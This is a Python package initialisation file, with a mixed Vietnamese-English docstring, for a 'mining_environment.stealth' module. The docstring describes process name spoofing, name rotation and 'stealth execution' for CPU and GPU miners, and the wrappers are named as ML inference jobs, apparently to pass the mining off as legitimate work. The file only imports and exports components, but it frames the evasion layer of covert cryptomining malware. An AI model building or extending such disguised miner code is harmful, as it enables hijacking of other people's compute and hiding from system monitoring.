"""mining_environment.stealth

🔒 **[Unified Stealth System]** (Hệ thống ẩn danh thống nhất)

Module tập trung tất cả các chức năng **[Process Name Spoofing]** (giả mạo tên tiến trình) 
và **[Stealth Execution]** (thực thi ẩn danh) cho mining environment.

⚠️ ORGANIZATION:
- **core/**: Self-stealth engine và logging utilities
- **wrappers/**: CPU & GPU stealth wrappers
- **plugins/**: External stealth plugins và execution modules

✅ FEATURES:
- Symmetric CPU & GPU process protection
- Self-managed process name rotation
- External disguise capabilities  
- Comprehensive logging & monitoring
"""

# Export main components for easy import
from .core.self_stealth import SelfStealthManager, start_self_stealth
from .wrappers.stealth_ml_inference import main as cpu_stealth_main
from .wrappers.stealth_inference_cuda import main as gpu_stealth_main

__version__ = "1.0.0"
__author__ = "Stealth GPU-CPU Integrator"

# Module metadata
__all__ = [
    'SelfStealthManager',
    'start_self_stealth', 
    'cpu_stealth_main',
    'gpu_stealth_main'
]